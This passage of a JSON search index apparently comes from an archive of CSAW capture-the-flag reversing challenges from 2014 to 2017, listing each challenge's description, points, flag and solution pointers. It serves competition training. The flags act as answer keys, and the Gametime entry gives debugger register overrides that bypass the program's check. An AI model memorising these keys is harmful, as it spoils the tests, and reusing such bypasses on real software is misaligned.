            "text": "Gametime\n\n\nAuthor\n\n\nbrad_anton\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nGuess what time it is! That's right! Gametime! Wowwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww!!!!!!!!!!!!\nnote: flag is not in flag{} format\n\n\nFlag\n\n\n(no5c30416d6cf52638460377995c6a8cf5)\n\n\nSolution\n\n\nYou \ncould\n maybe check your speed with the game, but really the solution to reverse out the leading sequence of character presses (they're static), then either reverse out the key or probably much quicker is to:\n\n\n\n\nAttach the debugger, set the following breakpoints to overwrite register values to fast track you to the key. You'll need to adjust the image address at run time:\n\n\n\n\nbp image010c0000 + 18d8 \nr edx=1;g;\n\n\nbp image010c0000 + 1916 \nr esi=13;g;\n\n\n\n\nLet the program start, paste in the following sequence, including spaces: \n\n\n\n\n\" xm xmmx mmxxmx  xm\"\n\n\nA vuln in the program logic allows the user to add character to the key press buffer before they're prompted to. \n\n\nFinally the program will spit out:\n\nkey is  (no5c30416d6cf52638460377995c6a8cf5)\n\n\nPremise\n\n\nA game that requires a user to type either space ('s'), 'm' or 'x' when prompted. If they are fast enough, they get the key. \n\n\nWarnings\n\n\nEverything should be statically compiled. I tested on two different  Win8.1 VMs with no problem. If someone gets DLL loading errors, they most likely need to download Microsoft's Visual C Runtime Library.", 
            "title": "Gametime"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#gametime", 
            "text": "", 
            "title": "Gametime"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#author", 
            "text": "brad_anton", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#description", 
            "text": "Guess what time it is! That's right! Gametime! Wowwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww!!!!!!!!!!!!\nnote: flag is not in flag{} format", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#flag", 
            "text": "(no5c30416d6cf52638460377995c6a8cf5)", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#solution", 
            "text": "You  could  maybe check your speed with the game, but really the solution to reverse out the leading sequence of character presses (they're static), then either reverse out the key or probably much quicker is to:   Attach the debugger, set the following breakpoints to overwrite register values to fast track you to the key. You'll need to adjust the image address at run time:   bp image010c0000 + 18d8  r edx=1;g;  bp image010c0000 + 1916  r esi=13;g;   Let the program start, paste in the following sequence, including spaces:    \" xm xmmx mmxxmx  xm\"  A vuln in the program logic allows the user to add character to the key press buffer before they're prompted to.   Finally the program will spit out: key is  (no5c30416d6cf52638460377995c6a8cf5)", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#premise", 
            "text": "A game that requires a user to type either space ('s'), 'm' or 'x' when prompted. If they are fast enough, they get the key.", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2016/reversing/Gametime/#warnings", 
            "text": "Everything should be statically compiled. I tested on two different  Win8.1 VMs with no problem. If someone gets DLL loading errors, they most likely need to download Microsoft's Visual C Runtime Library.", 
            "title": "Warnings"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/", 
            "text": "Rock\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nNever forget the people's champ.\n\n\nFlag\n\n\nFLAG{IoDJuvwxy\\tuvyxwxvwzx{\\z{vwxyz}\n\n\nSolution\n\n\nSee \nsolution.cpp", 
            "title": "Rock"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#rock", 
            "text": "", 
            "title": "Rock"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#description", 
            "text": "Never forget the people's champ.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#flag", 
            "text": "FLAG{IoDJuvwxy\\tuvyxwxvwzx{\\z{vwxyz}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/Rock/#solution", 
            "text": "See  solution.cpp", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/", 
            "text": "deedeedee\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\n\"Wow! I can run code at compile time! That's a pretty cool way to keep my flags secret. Hopefully I didn't leave any clues behind...\"\n\n\nFlag\n\n\nflag{t3mplat3_met4pr0gramming_is_gr8_4_3very0n3}\n\n\nSolution\n\n\nsolve.py\n\n\nSetup\n\n\ndmd deedeedee.d", 
            "title": "deedeedee"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#deedeedee", 
            "text": "", 
            "title": "deedeedee"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#description", 
            "text": "\"Wow! I can run code at compile time! That's a pretty cool way to keep my flags secret. Hopefully I didn't leave any clues behind...\"", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#flag", 
            "text": "flag{t3mplat3_met4pr0gramming_is_gr8_4_3very0n3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/deedeedee/#setup", 
            "text": "dmd deedeedee.d", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/", 
            "text": "Palo Alto\n\n\nAuthor\n\n\nPalo Alto Networks\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\n[Enter Starscream]\n\n\nOptimus Prime paces hastily between window and wall. He continues until all female dogs begin to walk around room on all fours.\n\n\n[Starscream, high pitched, annoying] : OPTIMUS YOU AND YOUR LITTLE AUTOBUTTS ARE GONNA GET REKT\n\n\n[Prime] : You might want to check yourself there Starscream\n\n\n[Starscream]: NOT EVEN BOI, WATCH ME QUICK SCOPE THE S$%\n OUT OF YOU\n\n\n[Prime]: I would like to see you try\n\n\nHat, sun glasses, and joint are adorned on Optimus Prime\n\n\n[Exeunt Starscream, feeling d-stroyed]\n\n\nNote: Flag format is \nCSAW{...}\n\n\nFlag\n\n\nCSAW{4D5DC530-5C8B-45EE-9D42-7D02A333A247}\n\n\nSolution\n\n\nRun with args 0xc3 0xa99cb7ac 0x6d73f0853dc6c795 0xdc1fc93aa5e45a24", 
            "title": "Decepticons"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#palo-alto", 
            "text": "", 
            "title": "Palo Alto"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#author", 
            "text": "Palo Alto Networks", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#description", 
            "text": "[Enter Starscream]  Optimus Prime paces hastily between window and wall. He continues until all female dogs begin to walk around room on all fours.  [Starscream, high pitched, annoying] : OPTIMUS YOU AND YOUR LITTLE AUTOBUTTS ARE GONNA GET REKT  [Prime] : You might want to check yourself there Starscream  [Starscream]: NOT EVEN BOI, WATCH ME QUICK SCOPE THE S$%  OUT OF YOU  [Prime]: I would like to see you try  Hat, sun glasses, and joint are adorned on Optimus Prime  [Exeunt Starscream, feeling d-stroyed]  Note: Flag format is  CSAW{...}", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#flag", 
            "text": "CSAW{4D5DC530-5C8B-45EE-9D42-7D02A333A247}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/Palo-Alto/#solution", 
            "text": "Run with args 0xc3 0xa99cb7ac 0x6d73f0853dc6c795 0xdc1fc93aa5e45a24", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/", 
            "text": "Key\n\n\nAuthor\n\n\nPoints\n\n\n125\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nSo I like to make my life difficult, and instead of a password manager, I make challenges that keep my secrets hidden. I forgot how to solve this one and it is the key to my house... Can you help me out? It's getting a little cold out here.\n\n\nNOTE: Flag is not in normal flag format.\n\n\nFlag\n\n\nidg_cni~bjbfi|gsxb\n\n\nSolution\n\n\nSee \nsolution.py", 
            "title": "Key"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#key", 
            "text": "", 
            "title": "Key"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#points", 
            "text": "125", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#description", 
            "text": "So I like to make my life difficult, and instead of a password manager, I make challenges that keep my secrets hidden. I forgot how to solve this one and it is the key to my house... Can you help me out? It's getting a little cold out here.  NOTE: Flag is not in normal flag format.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#flag", 
            "text": "idg_cni~bjbfi|gsxb", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/Key/#solution", 
            "text": "See  solution.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/", 
            "text": "A Rusty Road\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\n- Traverse these roads, win and obtain the flag\n\n\n\n\n\nFlag\n\n\nflag{D0wN_4nD_1eFt_WhEr3_Red_H3Rr1Ngz}\n\n\nSolution\n\n\nsolver.py\n\n\nPremise\n\n\nThis is an RE challenge for CSAW 2017\n- given is a compiled rust binary with symbols\n- within the binary is a game that consists of 4 different grids\n\n\n\n\n\n\na grid is a 10x10 board that has a number in each square\nthe numbers are generated with sieve of eratosthenes and a systematic shuffling\nof these results that correspond to one of the four boards\n\n\n\n\n\n\nThe goal is to traverse the board from the top left or 0,0 to \nthe bottom right or 9,9\n\n\n\n\n\n\n-The catch is that each grid during the traversal is changing based off the \ndirection moved\n\n\nEX: UP - BOARD1\n    DOWN - BOARD2\n    RIGHT - BOARD3\n    LEFT - BOARD4\n\n\neach correspond with a certain board\n\n\nA magic number obtained through this means of traversal gets you the flag", 
            "title": "Rusty Road"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#a-rusty-road", 
            "text": "", 
            "title": "A Rusty Road"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#description", 
            "text": "- Traverse these roads, win and obtain the flag", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#flag", 
            "text": "flag{D0wN_4nD_1eFt_WhEr3_Red_H3Rr1Ngz}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/rusty_road/#premise", 
            "text": "This is an RE challenge for CSAW 2017\n- given is a compiled rust binary with symbols\n- within the binary is a game that consists of 4 different grids    a grid is a 10x10 board that has a number in each square\nthe numbers are generated with sieve of eratosthenes and a systematic shuffling\nof these results that correspond to one of the four boards    The goal is to traverse the board from the top left or 0,0 to \nthe bottom right or 9,9    -The catch is that each grid during the traversal is changing based off the \ndirection moved  EX: UP - BOARD1\n    DOWN - BOARD2\n    RIGHT - BOARD3\n    LEFT - BOARD4  each correspond with a certain board  A magic number obtained through this means of traversal gets you the flag", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/", 
            "text": "rabbithole\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nHow far down the rabbit hole can you go?\n\n\nFlag\n\n\nflag{b3g1n_47_7h3_b3g1nn1ng_4nd_g0_0n_t1ll_y0u_h1t_th3_3nd}\n\n\nSolution\n\n\nsolve.py\n\n\nSetup\n\n\nGive competitors \nrabbithole", 
            "title": "Rabbithole"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#rabbithole", 
            "text": "", 
            "title": "rabbithole"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#description", 
            "text": "How far down the rabbit hole can you go?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#flag", 
            "text": "flag{b3g1n_47_7h3_b3g1nn1ng_4nd_g0_0n_t1ll_y0u_h1t_th3_3nd}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/rabbithole/#setup", 
            "text": "Give competitors  rabbithole", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/", 
            "text": "PROPHECY\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nThe prophecy is more important than either of us! Reveal its secrets, Zeratul! The future rests on it!\" -Karass-\n\n\nFlag\n\n\nflag{N0w_th3_x3l_naga_that_f0rg3d_us_a11_ar3_r3turn1ng_But_d0_th3y_c0m3_to_sav3_0r_t0_d3str0y?}\n\n\nSolution\n\n\nprophecy.py\n\n\nSetup\n\n\n\n\nsudo docker build -t \nprophecy\n [Path to Dockerfile]\n\n\nsudo docker run --name \nprophecy\n -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "PROPHECY"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#prophecy", 
            "text": "", 
            "title": "PROPHECY"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#description", 
            "text": "The prophecy is more important than either of us! Reveal its secrets, Zeratul! The future rests on it!\" -Karass-", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#flag", 
            "text": "flag{N0w_th3_x3l_naga_that_f0rg3d_us_a11_ar3_r3turn1ng_But_d0_th3y_c0m3_to_sav3_0r_t0_d3str0y?}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#solution", 
            "text": "prophecy.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/prophecy/#setup", 
            "text": "sudo docker build -t  prophecy  [Path to Dockerfile]  sudo docker run --name  prophecy  -d -p [PORT]:[PORT] [IMAGE]", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/", 
            "text": "Cookie Math\n\n\nAuthor\n\n\nGrazfather\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWho stole the cookie from the cookie box? They were pretty tightly packed.\n\n\nFlag\n\n\nREADME.md said \nflag{\n3rev3r5ibl3_cryp7_func$}\n\nChallenge source says \nflag{alg3bra_1z_sti11_fun_y0!}\n\n\nSolution", 
            "title": "Cookie Math"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#cookie-math", 
            "text": "", 
            "title": "Cookie Math"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#author", 
            "text": "Grazfather", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#description", 
            "text": "Who stole the cookie from the cookie box? They were pretty tightly packed.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#flag", 
            "text": "README.md said  flag{ 3rev3r5ibl3_cryp7_func$} \nChallenge source says  flag{alg3bra_1z_sti11_fun_y0!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/reversing/CookieMath/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/", 
            "text": "Hacking Time\n\n\nAuthor\n\n\nWagner\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe're getting a transmission from someone in the past, find out what he wants.\n\n\nFlag\n\n\nNOHACK4UXWRATHOFKFUHRERX\n\n\nSolution\n\n\nSetup", 
            "title": "Hacking Time"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#hacking-time", 
            "text": "", 
            "title": "Hacking Time"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#author", 
            "text": "Wagner", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#description", 
            "text": "We're getting a transmission from someone in the past, find out what he wants.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#flag", 
            "text": "NOHACK4UXWRATHOFKFUHRERX", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/HackingTime/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/", 
            "text": "FTP\n\n\nAuthor\n\n\nBohen\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe found an ftp service, I'm sure there's some way to log on to it.\n\n\nFlag\n\n\nflag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}\n\n\nSolution\n\n\nSetup", 
            "title": "FTP"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#ftp", 
            "text": "", 
            "title": "FTP"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#author", 
            "text": "Bohen", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#description", 
            "text": "We found an ftp service, I'm sure there's some way to log on to it.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#flag", 
            "text": "flag{n0_c0ok1e_ju$t_a_f1ag_f0r_you}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/reversing/ftp/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/", 
            "text": "CSAW 2013 Reversing 2\n\n\nAuthor\n\n\nCohen\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nWe got a little lazy so we just tweaked an old one a bit\n\n\nFlag\n\n\nflag{reversing_is_not_that_hard!}\n\n\nSolution\n\n\nSetup\n\n\nNotes\n\n\nThis challenge is named csaw2013reversing2.exe as a hint. It's very similiar to the second challenge from last year, where you have to run the program down a path that's going to print out the key and you still have to read the key out of memory because of a bug.\nMD5: 3d47ddf04cc6a8120c400a5f304e3ed6", 
            "title": "CSAW Reversing 2"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#csaw-2013-reversing-2", 
            "text": "", 
            "title": "CSAW 2013 Reversing 2"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#author", 
            "text": "Cohen", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#description", 
            "text": "We got a little lazy so we just tweaked an old one a bit", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#flag", 
            "text": "flag{reversing_is_not_that_hard!}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/reversing/csaw2013reversing2/#notes", 
            "text": "This challenge is named csaw2013reversing2.exe as a hint. It's very similiar to the second challenge from last year, where you have to run the program down a path that's going to print out the key and you still have to read the key out of memory because of a bug.\nMD5: 3d47ddf04cc6a8120c400a5f304e3ed6", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/", 
            "text": "BananaScript\n\n\nAuthor\n\n\nKyle Martin\n\n\nPoints\n\n\n450\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nNot too sure how to Interpret this, the lab member who wrote this \"forgot\" to write any documentation.  This shit, and him, is bananas. B, A-N-A-N-A-S.\n\n\nFlag\n\n\nflag{0r4ng3_3w3_ch1pp3r_1_h47h_n07_s4y_b4n4n4rs}\n\n\nSolution\n\n\nsolve.py\n\n\nSetup\n\n\nRelease \nmonkeyDo\n (the interpreter) and \nbanana.script\n (the program it interprets)\nRelease one more example script every now and then when nobody has solved", 
            "title": "Bananascript"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#bananascript", 
            "text": "", 
            "title": "BananaScript"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#author", 
            "text": "Kyle Martin", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#points", 
            "text": "450", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#description", 
            "text": "Not too sure how to Interpret this, the lab member who wrote this \"forgot\" to write any documentation.  This shit, and him, is bananas. B, A-N-A-N-A-S.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#flag", 
            "text": "flag{0r4ng3_3w3_ch1pp3r_1_h47h_n07_s4y_b4n4n4rs}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/bananascript/#setup", 
            "text": "Release  monkeyDo  (the interpreter) and  banana.script  (the program it interprets)\nRelease one more example script every now and then when nobody has solved", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/", 
            "text": "realism\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nDid you know that x86 is really old? I found a really old Master Boot Record that I thought was quite interesting! At least, I think it's really old...\n\n\nFlag\n\n\nflag{4r3alz_m0d3_y0}\n\n\nSolution\n\n\nsolve.py\n\n\nPremise\n\n\nx86 MBR that uses SSE instructions \n:)\n\n\nSetup\n\n\nRun cmd (please give them this): \n\nqemu-system-i386 -drive format=raw,file=main.bin", 
            "title": "Realism"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#realism", 
            "text": "", 
            "title": "realism"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#description", 
            "text": "Did you know that x86 is really old? I found a really old Master Boot Record that I thought was quite interesting! At least, I think it's really old...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#flag", 
            "text": "flag{4r3alz_m0d3_y0}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#premise", 
            "text": "x86 MBR that uses SSE instructions  :)", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/reversing/realism/#setup", 
            "text": "Run cmd (please give them this):  qemu-system-i386 -drive format=raw,file=main.bin", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/", 
            "text": "48-bit bomb lab\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\nwhat, you've never seen an x86-48 bomb lab before?\nIts just another bomb lab. \nNOTE: The flag in the binary is a placeholder. Please run against the remote system to get the real flag!\n\n\nFlag\n\n\nflag{turns_out_heavens_gate_works_on_linux_too_yote}\n\n\nSolution\n\n\nsolver.py\n\n\nPremise\n\n\nThis is a reversing challenge that abuses the ability to define a segment selector in certain far jmp instructions to obfuscate an otherwise fairly straightworward bomb-lab style challenge.\nTeams are expected to reverse each phase of the bomb lab and provide an input that will allow them to continue to the next phase until they can reach flag printing code.\nPhase 1 involves a constant global 32 byte string. the program takes user input into a buffer, then jumps to 64 bit execution and loads the whole string into rax, rbx, rcx, and rdx. it compares rax, rbx, and rdx to the proper offsets into the user to see if they input the same string, but rcx gets bswapped in 64 bit, then a compares ecx against the third chunk of the input string in 32 bit execution mode.\nPhase 2\nrelease yeetlab_release", 
            "title": "48-bit yeet lab"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#48-bit-bomb-lab", 
            "text": "", 
            "title": "48-bit bomb lab"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#description", 
            "text": "what, you've never seen an x86-48 bomb lab before?\nIts just another bomb lab. \nNOTE: The flag in the binary is a placeholder. Please run against the remote system to get the real flag!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#flag", 
            "text": "flag{turns_out_heavens_gate_works_on_linux_too_yote}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/reversing/48-bit_yeet_lab/#premise", 
            "text": "This is a reversing challenge that abuses the ability to define a segment selector in certain far jmp instructions to obfuscate an otherwise fairly straightworward bomb-lab style challenge.\nTeams are expected to reverse each phase of the bomb lab and provide an input that will allow them to continue to the next phase until they can reach flag printing code.\nPhase 1 involves a constant global 32 byte string. the program takes user input into a buffer, then jumps to 64 bit execution and loads the whole string into rax, rbx, rcx, and rdx. it compares rax, rbx, and rdx to the proper offsets into the user to see if they input the same string, but rcx gets bswapped in 64 bit, then a compares ecx against the third chunk of the input string in 32 bit execution mode.\nPhase 2\nrelease yeetlab_release", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/", 
            "text": "Gopherz\n\n\nAuthor\n\n\nPoints\n\n\n350\n\n\nCategory\n\n\nReversing\n\n\nDescription\n\n\ngopher://reversing.chal.csaw.io:7070\n\n\nFlag\n\n\nflag{tunnel_gopherz_ro0l}\n\n\nSolution\n\n\nsolver.py", 
            "title": "gopherz"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/#gopherz", 
            "text": "", 
            "title": "Gopherz"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/#points", 
            "text": "350", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/reversing/gopherz/#category", 
            "text": "Reversing", 
            "title": "Category"
        }, 
        {
